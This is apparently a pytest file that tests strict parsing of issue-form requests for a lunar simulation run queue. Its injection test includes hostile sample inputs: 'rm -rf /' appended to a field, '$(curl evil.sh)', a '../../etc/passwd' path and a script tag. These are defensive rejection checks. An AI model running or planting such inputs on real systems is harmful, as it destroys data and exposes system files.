"""Run queue (B-37, tools/actions/run_issue.py): strict form parsing, scenario mapping, a small dry run."""
import gzip, json, os, sys, tarfile
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "tools", "actions"))
import pytest

import run_issue as R

SAMPLE = os.path.join(ROOT, "tools", "actions", "sample_issue.md")


def body(**over):
    vals = {"Phase": "P2", "Fleet preset": "P2: 4 vehicles", "Job rule": "marketplace",
            "Terrain and Phase-3 models": "on", "Pad standoff (km)": "1", "Plume keep-out radius (km)": "1",
            "Night share of each lunar day": "0.15", "Round-trip delay (s)": "5", "Operators on console": "2",
            "Earth link": "dte", "Supervised driving policy": "strict", "Seeds": "3", "Purpose": "_No response_"}
    vals.update(over)
    return "\n\n".join(f"### {k}\n\n{v}" for k, v in vals.items() if v is not None) + "\n"


def test_sample_issue_parses_and_maps():
    req = R.parse_body(open(SAMPLE, encoding="utf-8").read())
    assert req["phase"] == "P2" and req["seeds"] == 2 and req["n_operators"] == 2 and req["rtt_s"] == 5.0
    sc, mech = R.scenario_from_request(req)
    assert mech == "marketplace" and len(sc.fleet) == 4 and sc.n_operators == 2
    assert sc.terrain == "connecting_ridge" and sc.pad_standoff_km == "1" and sc.autonomy_model == "driving-v1"
    assert sc.plume == {"keepout_km": 1.0, "standdown_h": 0.5, "shelter": "auto"}
    assert sc.comms == {"supervised_policy": "strategic+avoid", "mode": "dte"}
    assert 2 * sc.one_way_latency_s + sc.ground_delay_s == pytest.approx(5.0)


def test_comms_and_terrain_variants():
    sc, _ = R.scenario_from_request(R.parse_body(body(**{"Earth link": "dte+relay 0.8"})))
    assert sc.comms["mode"] == "dte+relay" and sc.comms["relay"]["coverage"] == 0.8
    sc, _ = R.scenario_from_request(R.parse_body(body(**{"Earth link": "dte + BASE mast"})))
    assert sc.comms["mast"]["height_m"] == 10.0
    sc, _ = R.scenario_from_request(R.parse_body(body(**{"Earth link": "off", "Terrain and Phase-3 models": "off",
                                                          "Plume keep-out radius (km)": "none", "Phase": "P1",
                                                          "Fleet preset": "phase default"})))
    assert sc.comms is None and sc.terrain is None and sc.plume is None and sc.name == "issue-P1-default"


@pytest.mark.parametrize("over,msg", [
    ({"Seeds": "31"}, "outside"), ({"Seeds": "0"}, "outside"), ({"Seeds": "2.5"}, "whole number"),
    ({"Round-trip delay (s)": "-1"}, "not a number"), ({"Round-trip delay (s)": "31"}, "outside"),
    ({"Night share of each lunar day": "0.9"}, "outside"), ({"Operators on console": "1e3"}, "not a whole number"),
    ({"Phase": "P4"}, "not one of"), ({"Job rule": "marketplace; rm -rf /"}, "not one of"),
    ({"Earth link": "$(curl evil.sh)"}, "not one of"), ({"Pad standoff (km)": "../../etc/passwd"}, "not one of"),
    ({"Seeds": "3\n### Extra"}, "unknown section"), ({"Seeds": None}, "missing field"),
    ({"Fleet preset": "P2: 4 vehicles", "Phase": "P3"}, "P2 only"),
    ({"Terrain and Phase-3 models": "off"}, "keep-out needs"),
    ({"Phase": "P2\nP3"}, "single value"),
])
def test_rejects_out_of_range_and_injection(over, msg):
    with pytest.raises(R.Rejected, match=msg):
        R.parse_body(body(**over))


def test_rejects_edited_bodies():
    with pytest.raises(R.Rejected, match="twice"):
        R.parse_body(body() + "\n### Seeds\n\n2\n")
    with pytest.raises(R.Rejected, match="before the first"):
        R.parse_body("run this: import os\n" + body())
    with pytest.raises(R.Rejected, match="unknown section"):
        R.parse_body(body().replace("### Seeds", "### Seeds and also a script"))


def test_purpose_is_escaped_and_truncated():
    req = R.parse_body(body(Purpose="@everyone <script>x</script> **bold** | table " + "a" * 900))
    assert len(req["purpose"]) == R.PURPOSE_MAX
    e = R._escape(req["purpose"])
    assert "@​everyone" in e and "<script>" not in e and "\\*\\*bold\\*\\*" in e and "\\|" in e
    assert all(line.startswith("> ") for line in e.split("\n"))


def test_main_rejects_with_exit_code_and_error_file(tmp_path):
    bad = tmp_path / "bad.md"
    bad.write_text(body(Seeds="99"), encoding="utf-8")
    assert R.main(["--body-file", str(bad), "--issue", "7", "--out", str(tmp_path / "o"), "--max-seconds", "0"]) == 2
    assert "outside" in (tmp_path / "o" / "error.md").read_text(encoding="utf-8")


def test_dry_run_small_terrain_off(tmp_path):
    """The whole pipeline with terrain off (fast): summary, trace, comment; no scene package."""
    req = R.parse_body(body(**{"Terrain and Phase-3 models": "off", "Plume keep-out radius (km)": "none",
                               "Earth link": "always", "Seeds": "2"}))
    s = R.run_request(req, 5, str(tmp_path), horizon_h=1000.0, log=lambda *a: None)
    assets = sorted(os.listdir(tmp_path / "assets"))
    assert assets == ["summary.json", "trace_seed0.json.gz"]
    doc = json.load(open(tmp_path / "assets" / "summary.json", encoding="utf-8"))
    assert doc["format"] == "lunarsim-run" and len(doc["rows"]) == 2 and doc["scenario_sha"]
    p = doc["provenance"]
    assert {"engine_version", "git_sha", "lock_sha", "python", "platform", "data_shas"} <= set(p)
    tr = json.loads(gzip.decompress(open(tmp_path / "assets" / "trace_seed0.json.gz", "rb").read()))
    assert tr["format"] == "lunarsim-trace" and tr["version"] == 1
    c = (tmp_path / "comment.md").read_text(encoding="utf-8")
    assert "| Delivered cargo (t / year) |" in c and "releases/tag/run-5" in c and "world/?run=5" in c
